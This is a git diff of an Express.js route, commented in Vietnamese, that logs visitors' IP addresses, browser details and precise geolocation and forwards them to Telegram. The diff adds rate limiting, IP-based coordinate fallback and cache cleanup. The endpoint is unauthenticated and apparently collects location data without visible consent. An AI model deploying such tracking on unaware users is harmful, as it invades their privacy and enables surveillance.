@@ -3,6 +3,11 @@ const router = express.Router();
 const IPLog = require('../models/IPLog');
 const sendIPNotification = require('../utils/sendTelegram');
 
+// Cache để lưu trữ thời gian truy cập gần nhất của mỗi IP
+const ipLogCache = {};
+// Thời gian tối thiểu giữa 2 lần ghi nhận log (5 giây)
+const MIN_LOG_INTERVAL = 5000;
+
 // Route ẩn danh để ghi nhận IP - không cần xác thực
 router.post('/log-ip', async (req, res) => {
     try {
@@ -14,6 +19,17 @@ router.post('/log-ip', async (req, res) => {
             req.connection.remoteAddress ||
             req.socket.remoteAddress ||
             (req.connection.socket ? req.connection.socket.remoteAddress : 'unknown');
+
+        // Kiểm tra thời gian truy cập gần nhất
+        const currentTime = Date.now();
+        const lastLogTime = ipLogCache[ip] || 0;
+        if (currentTime - lastLogTime < MIN_LOG_INTERVAL) {
+            // Đã ghi nhận gần đây, trả về ngay lập tức
+            return res.status(204).end();
+        }
+
+        // Cập nhật thời gian truy cập gần nhất
+        ipLogCache[ip] = currentTime;
 
         // Lấy thông tin trình duyệt
         const userAgent = req.headers['user-agent'] || '';
@@ -62,8 +78,8 @@ router.post('/log-ip', async (req, res) => {
             },
             timeZone: req.body.timeZone || '',
             location: {
-                latitude: req.body.latitude || null,
-                longitude: req.body.longitude || null,
+                latitude: req.body.latitude || req.body.ipBasedLatitude || null,
+                longitude: req.body.longitude || req.body.ipBasedLongitude || null,
                 accuracy: req.body.accuracy || null,
                 altitude: req.body.altitude || null,
                 altitudeAccuracy: req.body.altitudeAccuracy || null,
@@ -206,14 +222,17 @@ router.post('/log-ip', async (req, res) => {
         }
 
         // Gửi thông báo qua Telegram với thông tin nâng cao
-        // Truyền đối tượng time thay vì chuỗi để định dạng theo múi giờ Việt Nam
+        // Không đợi kết quả để đảm bảo phản hồi nhanh cho client
         sendIPNotification(
             ip,
-            time, // Truyền trực tiếp đối tượng Date thay vì chuỗi đã định dạng
+            time,
             userAgent,
             path,
             extraInfo.join('\n')
         ).catch(() => { });
+
+        // Dọn dẹp ipLogCache định kỳ để tránh rò rỉ bộ nhớ
+        cleanupIpLogCache();
 
         // Trả về response 204 (No Content)
         res.status(204).end();
@@ -222,6 +241,21 @@ router.post('/log-ip', async (req, res) => {
         res.status(204).end();
     }
 });
+
+/**
+ * Dọn dẹp bộ nhớ đệm ipLogCache để tránh rò rỉ bộ nhớ
+ */
+function cleanupIpLogCache() {
+    const currentTime = Date.now();
+    const ONE_HOUR = 3600000; // 1 giờ
+
+    // Chỉ giữ lại các mục có thời gian gần đây (trong vòng 1 giờ)
+    for (const ip in ipLogCache) {
+        if (currentTime - ipLogCache[ip] > ONE_HOUR) {
+            delete ipLogCache[ip];
+        }
+    }
+}
 
 // Route bảo mật để lấy danh sách IP - yêu cầu mật khẩu
 router.get('/ip-logs', async (req, res) => {
